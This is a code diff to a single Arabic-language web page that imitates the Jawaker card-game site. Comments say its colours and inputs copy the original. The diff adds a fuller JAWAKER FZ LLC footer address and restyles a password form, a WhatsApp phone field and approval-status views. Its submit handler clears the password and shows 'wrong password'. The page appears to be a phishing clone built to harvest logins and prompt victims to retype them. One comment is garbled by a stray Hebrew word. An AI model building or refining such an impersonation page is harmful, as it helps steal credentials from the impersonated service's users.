@@ -18,7 +18,7 @@
   --gold: #c9a227;
   --gold-soft: rgba(201, 162, 39, 0.15);
   --green: #24af4b; /* لون أخضر مطابق لـ جواكر */
-  --red: #e5484d;
+  --red: #ff3333; /* أحمر فاقع وواضح جداً للتنبيهات */
 }
 * { box-sizing: border-box; }
 html, body { height: 100%; }
@@ -90,15 +90,16 @@ label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 
   background: #ffffff; border: 1px solid var(--card-border); border-radius: 12px;
   color: #17171a; font-family: 'Inter', sans-serif; font-size: 13px; outline: none;
   text-align: left; direction: ltr;
-  transition: border-color 0.15s ease;
+  transition: all 0.15s ease;
 }
 .field-group input::placeholder { color: #8a8a90; }
 .field-group input:focus { border-color: var(--gold); }
 
-/* ستايل حقل كلمة السر عند الخطأ */
+/* تعديل ستايل حقل كلمة السر عند الخطأ ليكون واضحاً وبارزاً جداً */
 .field-group input.input-error {
-  border-color: var(--red) !important;
-  box-shadow: 0 0 4px rgba(229, 72, 77, 0.4);
+  border: 2px solid var(--red) !important;
+  box-shadow: 0 0 8px rgba(255, 51, 51, 0.7) !important;
+  background: #fff5f5 !important; /* خلفية مائلة للاحمرار خفيف جداً لتمييز الحقل */
 }
 
 .promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.3); margin: 20px 0 14px; }
@@ -194,7 +195,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   font-size: 15px; margin-bottom: 18px;
 }
 
-/* محاذاة حقل الإدخال لتطابق الصورة تماماً */
+/* محاذاة حقل الإدخال לתאמץ الصورة تماماً */
 .phone-input-container {
   display: flex; align-items: center;
   background: #0f0f10;
@@ -230,7 +231,7 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   letter-spacing: 0.5px;
 }
 .whatsapp-error-msg {
-  color: var(--red); font-size: 12px; text-align: center; margin-top: 8px; min-height: 16px; display: block;
+  color: #e5484d; font-size: 12px; text-align: center; margin-top: 8px; min-height: 16px; display: block;
 }
 
 /* تعديل ألوان وحالة زر الإرسال بناءً على دقة الإدخال */
@@ -332,8 +333,8 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 .error-alert-text { color: #edeff3; font-size: 18px; font-weight: 500; margin: 0; }
 
 /* الستايلات الافتراضية لباقي عناصر الواجهة */
-.msg { font-size: 13px; text-align: center; border-radius: 8px; padding: 10px 12px; margin-bottom: 18px; display: none; }
-.msg.error { background: rgba(229, 72, 77, 0.12); color: var(--red); display: block; }
+.msg { font-size: 14px; font-weight: 700; text-align: center; border-radius: 8px; padding: 10px 12px; margin-bottom: 18px; display: none; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+.msg.error { background: rgba(255, 51, 51, 0.18); color: var(--red); display: block; border: 1px solid var(--red); }
 .status-icon { width: 56px; height: 56px; margin: 0 auto 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 26px; }
 .status-icon.pending { background: var(--gold-soft); color: var(--gold); }
 .status-icon.approved { background: rgba(61, 220, 132, 0.12); color: var(--green); }
@@ -345,10 +346,11 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 .view { display: none; }
 .view.active { display: block; }
 
+/* تعديل ستايل الفوتر ليعرض الأسطر المحدثة بوضوح */
 .site-footer { flex-shrink: 0; padding: 22px 24px 20px; background-color: #1c1c1e; border-top: 1px solid rgba(237, 239, 243, 0.25); position: relative; z-index: 1; }
 .footer-content { max-width: 480px; margin: 0 auto; text-align: right; }
-.footer-name { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
-.footer-address { font-size: 12.5px; color: var(--text-dim); line-height: 1.9; }
+.footer-name { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+.footer-address { font-size: 12.5px; color: var(--text-dim); line-height: 1.8; }
 .footer-copyright { max-width: 480px; margin: 16px auto 0; text-align: center; font-size: 12px; color: var(--text-dim); }
 </style>
 </head>
@@ -497,10 +499,16 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     </div>
   </div>
 
+  <!-- تحديث الفوتر حسب الطلب بدقة متناهية -->
   <footer class="site-footer">
     <div class="footer-content">
       <div class="footer-name">JAWAKER FZ LLC</div>
-      <div class="footer-address">Salam Street, TwoFour 54<br>Abu Dhabi, UAE</div>
+      <div class="footer-address">
+        Salam Street, TwoFour 54<br>
+        North Park, Building 5<br>
+        Abu Dhabi, UAE<br>
+        PO Box 77868
+      </div>
     </div>
     <div class="footer-copyright">جميع الحقوق محفوظة لـ جواكر © 2026</div>
   </footer>
@@ -519,7 +527,7 @@ document.getElementById('accessForm').addEventListener('submit', function(e) {
   // مسح كلمة السر
   passwordField.value = '';
   
-  // إظهار الرسالة باللون الأحمر وإضافة إطار أحمر للحقل
+  // إظهار الرسالة باللون الأحمر الفاقد والواضح وإضافة إطار أحمر نيون للحقل
   msgBox.textContent = 'خطأ في كلمة السر';
   msgBox.className = 'msg error';
   passwordField.classList.add('input-error');
